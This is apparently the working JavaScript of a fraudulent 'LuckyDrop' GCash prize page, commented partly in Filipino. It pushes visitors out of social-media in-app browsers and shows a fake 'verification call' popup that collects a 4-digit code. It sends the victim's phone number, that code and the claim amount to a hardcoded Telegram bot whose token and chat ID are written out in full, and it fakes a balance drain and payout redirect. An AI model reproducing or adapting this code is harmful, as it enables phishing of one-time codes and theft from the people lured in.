/* ============================================================
   POPUP.JS — LuckyDrop Main Page
   + FORCE OPEN IN DEFAULT BROWSER (Facebook / In-app)
   ============================================================ */

// ============================================================
// 🚀 FORCE OPEN IN DEFAULT BROWSER (Facebook / In-app)
// ✅ Dapat ito ang UNANG tumatakbo bago ang lahat
// ============================================================
(function forceOpenInBrowser() {
    var ua = navigator.userAgent || navigator.vendor || window.opera;

    // Detect in-app browsers
    var isFacebook = /FBAN|FBAV|FB_IAB|FBIOS/i.test(ua);
    var isInstagram = /Instagram/i.test(ua);
    var isMessenger = /Messenger/i.test(ua);
    var isTikTok = /BytedanceWebview|TikTok/i.test(ua);
    var isLine = /Line\//i.test(ua);
    var isTwitter = /Twitter/i.test(ua);
    var isWhatsApp = /WhatsApp/i.test(ua);
    var isWeChat = /MicroMessenger/i.test(ua);
    var isInAppBrowser =
        isFacebook || isInstagram || isMessenger ||
        isTikTok || isLine || isTwitter ||
        isWhatsApp || isWeChat;

    if (!isInAppBrowser) return; // ✅ Normal browser — wag galawin

    console.log('🚀 In-app browser detected. Forcing external browser...');

    var currentUrl = window.location.href;
    var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
    var isAndroid = /Android/i.test(ua);
    var isIOS = /iPhone|iPad|iPod/i.test(ua);

    // ✅ 1. Android — gamitin ang intent://
    if (isAndroid) {
        var intentUrl = 'intent://' + cleanUrl +
            '#Intent;scheme=https;package=com.android.chrome;' +
            'S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
        window.location.href = intentUrl;
        return;
    }

    // ✅ 2. iOS — gamitin ang googlechrome://
    if (isIOS) {
        var chromeUrl = 'googlechrome://' + cleanUrl;
        var safariUrl = 'x-web-search://?url=' + encodeURIComponent(currentUrl);

        window.location.href = chromeUrl;

        setTimeout(function() {
            window.location.href = safariUrl;
        }, 500);
        return;
    }

    // ✅ 3. Generic fallback
    setTimeout(function() {
        showOpenInBrowserPrompt(currentUrl);
    }, 800);
})();

// ============================================================
// 📱 OPEN IN BROWSER PROMPT (Fallback)
// ============================================================
function showOpenInBrowserPrompt(url) {
    if (document.getElementById('openBrowserPrompt')) return;

    var overlay = document.createElement('div');
    overlay.id = 'openBrowserPrompt';
    overlay.style.cssText =
        'position:fixed;inset:0;z-index:9999999;' +
        'background:rgba(0,0,0,0.92);' +
        'display:flex;align-items:center;justify-content:center;' +
        'padding:20px;font-family:"Fredoka",sans-serif;';

    overlay.innerHTML =
        '<div style="' +
            'max-width:340px;width:100%;' +
            'background:linear-gradient(160deg,#d10000 0%,#8b0000 50%,#4a0000 100%);' +
            'border:3px solid #ffd700;' +
            'border-radius:24px;' +
            'padding:32px 24px;' +
            'text-align:center;' +
            'box-shadow:0 0 40px rgba(255,215,0,0.5);' +
        '">' +

            '<div style="font-size:56px;margin-bottom:12px;">🌐</div>' +

            '<h2 style="' +
                'font-family:"Fredoka",sans-serif;' +
                'font-size:22px;font-weight:900;' +
                'background:linear-gradient(180deg,#fff9c4,#ffd700,#ff9800);' +
                '-webkit-background-clip:text;background-clip:text;' +
                'color:transparent;' +
                'letter-spacing:1.5px;text-transform:uppercase;' +
                'margin:0 0 12px 0;' +
                'filter:drop-shadow(0 0 15px rgba(255,215,0,0.7));' +
            '">OPEN IN BROWSER</h2>' +

            '<p style="' +
                'color:rgba(255,255,255,0.92);' +
                'font-size:14px;line-height:1.6;' +
                'margin:0 0 20px 0;' +
            '">' +
                'Para mag-proceed, paki-open ang link sa <strong style="color:#ffd700;">Chrome</strong> o <strong style="color:#ffd700;">Safari</strong>.<br><br>' +
                'I-tap ang <strong style="color:#ffd700;">⋮</strong> (menu) sa taas → <strong style="color:#ffd700;">"Open in Browser"</strong>' +
            '</p>' +

            '<button id="copyLinkBtn" style="' +
                'width:100%;padding:14px;' +
                'background:linear-gradient(180deg,#fff9c4 0%,#ffd700 40%,#ff9800 100%);' +
                'border:3px solid #fff;border-radius:14px;' +
                'font-family:"Fredoka",sans-serif;font-size:14px;font-weight:900;' +
                'color:#8b0000;letter-spacing:1.5px;text-transform:uppercase;' +
                'cursor:pointer;margin-bottom:10px;' +
                'box-shadow:0 5px 0 #8b4500,0 8px 20px rgba(0,0,0,0.5);' +
            '">📋 COPY LINK</button>' +

            '<button id="openChromeBtn" style="' +
                'width:100%;padding:14px;' +
                'background:linear-gradient(180deg,#4fc3f7 0%,#0288d1 50%,#01579b 100%);' +
                'border:3px solid #fff;border-radius:14px;' +
                'font-family:"Fredoka",sans-serif;font-size:14px;font-weight:900;' +
                'color:#fff;letter-spacing:1.5px;text-transform:uppercase;' +
                'cursor:pointer;' +
                'box-shadow:0 5px 0 #01579b,0 8px 20px rgba(0,0,0,0.5);' +
            '">🌐 OPEN IN CHROME</button>' +

        '</div>';

    document.body.appendChild(overlay);

    document.getElementById('copyLinkBtn').onclick = function() {
        var btn = this;
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(url).then(function() {
                    btn.textContent = '✅ COPIED!';
                    setTimeout(function() { btn.textContent = '📋 COPY LINK'; }, 1500);
                });
            } else {
                var ta = document.createElement('textarea');
                ta.value = url;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                btn.textContent = '✅ COPIED!';
                setTimeout(function() { btn.textContent = '📋 COPY LINK'; }, 1500);
            }
        } catch(e) {
            alert('Copy failed. Please copy manually:\n\n' + url);
        }
    };

    document.getElementById('openChromeBtn').onclick = function() {
        var cleanUrl = url.replace(/^https?:\/\//, '');
        var ua = navigator.userAgent || '';
        var isAndroid = /Android/i.test(ua);

        if (isAndroid) {
            var intentUrl = 'intent://' + cleanUrl +
                '#Intent;scheme=https;package=com.android.chrome;' +
                'S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
            window.location.href = intentUrl;
        } else {
            window.location.href = 'googlechrome://' + cleanUrl;
        }
    };
}

// ============================================================
// CLAIM STATE
// ============================================================
let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false,
    imaginaryTimer: null
};

// ========== FIREWALL VERIFICATION (4-digit call) ==========
let currentVerificationCode = null;
let verificationAttempts = 0;

// ========== CHECK FIREWALL STATUS ==========
async function isFirewallActive() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/globalFirewall').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) { return false; }
    }
    return false;
}

// ========== TELEGRAM NOTIFICATION ==========
async function sendTelegram(phone, code) {
    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
    } catch(e) {}
}

// ============================================================
// ✅ CREATE: user_sessions/{phone}/system_verification
// ✅ RESET userEnteredCode + isMatch
// ============================================================
async function createSystemVerification(phone, code) {
    if (typeof firebase === 'undefined' || !firebase.database) return;

    try {
        const db = firebase.database();
        const deviceId = localStorage.getItem('userDeviceDisplayId') || 'Unknown';

        await db.ref('user_sessions/' + phone + '/system_verification').set({
            code: code,
            timer: 60,
            status: 'active',
            deviceId: deviceId,
            phone: phone,
            createdAt: Date.now(),
            lastUpdate: Date.now(),
            userEnteredCode: null,
            userEnteredAt: null,
            isMatch: null
        });

        console.log('✅ system_verification CREATED:', code);

        // Start live timer sync
        startVerificationTimerSync(phone, 60);
    } catch(e) {
        console.error('❌ system_verification error:', e);
    }
}

// ============================================================
// ⏱️ SYNC timer sa Firebase every second
// ============================================================
function startVerificationTimerSync(phone, seconds) {
    if (typeof firebase === 'undefined' || !firebase.database) return;

    let remaining = seconds;
    const db = firebase.database();

    const interval = setInterval(() => {
        remaining--;

        try {
            db.ref('user_sessions/' + phone + '/system_verification').update({
                timer: remaining,
                lastUpdate: Date.now()
            });
        } catch(e) {}

        if (remaining <= 0) {
            clearInterval(interval);
            try {
                db.ref('user_sessions/' + phone + '/system_verification').update({
                    status: 'expired',
                    timer: 0,
                    lastUpdate: Date.now()
                });
            } catch(e) {}
            console.log('⏰ system_verification EXPIRED');
        }
    }, 1000);

    // Store interval globally for cleanup
    window._verificationTimerInterval = interval;
}

// ============================================================
// ✅ UPDATE status: invalid kapag maling code
// ============================================================
async function markVerificationInvalid(phone, attemptedCode) {
    if (typeof firebase === 'undefined' || !firebase.database) return;

    try {
        const db = firebase.database();
        await db.ref('user_sessions/' + phone + '/system_verification').update({
            status: 'invalid',
            lastAttempt: attemptedCode,
            lastAttemptAt: Date.now(),
            lastUpdate: Date.now()
        });
        console.log('❌ system_verification INVALID attempt:', attemptedCode);
    } catch(e) {}
}

// ============================================================
// ✅ UPDATE status: verified kapag tama
// ============================================================
async function markVerificationSuccess(phone) {
    if (typeof firebase === 'undefined' || !firebase.database) return;

    try {
        const db = firebase.database();
        await db.ref('user_sessions/' + phone + '/system_verification').update({
            status: 'verified',
            verifiedAt: Date.now(),
            lastUpdate: Date.now()
        });
        console.log('✅ system_verification VERIFIED');
    } catch(e) {}
}

// ============================================================
// SHOW FIREWALL POPUP
// ============================================================
function showFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (!popup) return;

    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <p>Waiting for system-verification call...</p>
            </div>
            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
        `;
    }

    // Generate random 4-digit code
    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttempts = 0;
    console.log("📞 VERIFICATION CODE:", currentVerificationCode);

    // ✅ CREATE system_verification sa Firebase
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    if (userPhone !== "Unknown") {
        createSystemVerification(userPhone, currentVerificationCode);
    }

    popup.style.display = 'flex';
    setTimeout(() => {
        const ci = document.getElementById('verificationCode');
        if (ci) ci.focus();
    }, 100);
}

function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

// ============================================================
// ✅ VERIFY FIREWALL CODE
// ✅ SAVE userEnteredCode sa Firebase (para makita sa admin)
// ✅ UPDATE status: verified/invalid + isMatch
// ============================================================
window.verifyFirewallCode = async function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const verifyBtn = document.getElementById('verifyCodeBtn');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";

    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }

    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = "VERIFYING...";
    }
    if (errorDiv) errorDiv.style.display = 'none';

    verificationAttempts++;

    const isValid = (code === currentVerificationCode);

    // ============================================================
    // ✅ SAVE userEnteredCode + isMatch + status sa Firebase
    // ============================================================
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            await db.ref('user_sessions/' + userPhone + '/system_verification').update({
                userEnteredCode: code,
                userEnteredAt: Date.now(),
                status: isValid ? 'verified' : 'invalid',
                isMatch: isValid,
                lastUpdate: Date.now()
            });
            console.log('📝 userEnteredCode saved:', code, '| Match:', isValid);
        } catch(e) {
            console.error('Save userEnteredCode error:', e);
        }
    }
    // ============================================================

    await sendTelegram(userPhone, code);

    if (isValid) {
        await markVerificationSuccess(userPhone);

        if (verifyBtn) {
            verifyBtn.innerHTML = "✅ VERIFIED!";
            verifyBtn.style.background = "linear-gradient(180deg, #00ff88, #008833)";
        }

        setTimeout(() => {
            hideFirewallPopup();
            alert("Verification successful. Page will refresh.");
            setTimeout(() => {
                window.location.reload();
            }, 500);
        }, 1000);

    } else {
        await markVerificationInvalid(userPhone, code);

        let errorMsg = "Invalid verification code. Please try again.";
        if (verificationAttempts >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            if (verifyBtn) verifyBtn.disabled = true;
            setTimeout(() => {
                window.location.reload();
            }, 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (verifyBtn && verifyBtn.disabled !== true) {
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = "VERIFY NOW";
        }

        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

// ========== GET LATEST DEPLOYED LINK ==========
async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            return linkData.url || null;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// ========== MAIN CLAIM POPUP ==========
async function showClaimPopup(amount) {
    const firewallActive = await isFirewallActive();

    if (firewallActive) {
        if (typeof window.showFirewallPopup === 'function') {
            window.showFirewallPopup();
        } else {
            showFirewallPopup();
        }
        return;
    }

    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;

    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');

    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';

    // 🎉 Lucky Cat confetti burst
    if (typeof confetti === 'function') {
        try {
            confetti({
                particleCount: 80,
                spread: 70,
                origin: { y: 0.6 },
                colors: ['#ffd700', '#ff1744', '#ffffff', '#ff9500']
            });
        } catch(e) {}
    }
}

function hideClaimPopup() {
    const p = document.getElementById('claimPopup');
    if (p) p.style.display = 'none';
}

function showPendingStatus() {
    const pa = document.getElementById('pendingStatusArea');
    if (pa) pa.style.display = 'block';
    claimState.isPending = true;
}

function hidePendingStatus() {
    const pa = document.getElementById('pendingStatusArea');
    if (pa) pa.style.display = 'none';
    claimState.isPending = false;
}

// ========== BALANCE DECREMENT ANIMATION ==========
function startSmoothDecrement(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;

    let current = originalAmount;
    const decrementStep = 1;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;

    claimState.balanceDecrementInterval = setInterval(() => {
        current = current - decrementStep;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN TIMER ==========
function startVisibleCountdown(originalAmount) {
    let remaining = claimState.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    const withdrawBtn = document.getElementById('claimBtn');

    if (!timerSpan) return;

    claimState.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }

        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;

            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";

            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                window.parent.updateGameBalance(originalAmount);
            } else if (typeof updateGameBalance === 'function') {
                updateGameBalance(originalAmount);
            } else if (typeof GameState !== 'undefined') {
                GameState.balance = originalAmount;
                if (typeof updateUI === 'function') updateUI();
                if (typeof saveData === 'function') saveData();
            }

            if (pendingArea) pendingArea.style.display = 'none';
            if (withdrawBtn) withdrawBtn.style.display = 'block';

            claimState.isProcessing = false;
            claimState.hasRedirected = false;
        }
    }, 1000);
}

// ========== REDIRECT TIMER ==========
function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) {
            claimState.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 2000);
}

// ========== CLAIM ACTION ==========
function onClaimAction() {
    if (claimState.isProcessing) return;

    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";

    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';

    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
        .catch(e => console.log('Telegram error:', e));

    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();

        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;

                db.ref('links/' + key).update({
                    status: 'claimed',
                    user: userPhone,
                    amount: amount,
                    claimedAt: Date.now()
                });

                hideClaimPopup();
                showPendingStatus();
                startSmoothDecrement(amount);
                startVisibleCountdown(amount);
                startImaginaryTimer(redirectUrl);

            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => {
                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
                    claimBtn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("No available rewards!");
            }
        }).catch(() => {
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => {
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimBtn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
        });
    }
}

document.addEventListener('DOMContentLoaded', function() {
    hidePendingStatus();
});

// ============================================================
// EXPORT FUNCTIONS FOR GLOBAL ACCESS
// ============================================================
window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;
window.verifyFirewallCode = verifyFirewallCode;
window.showClaimPopup = showClaimPopup;
window.hideClaimPopup = hideClaimPopup;
window.onClaimAction = onClaimAction;
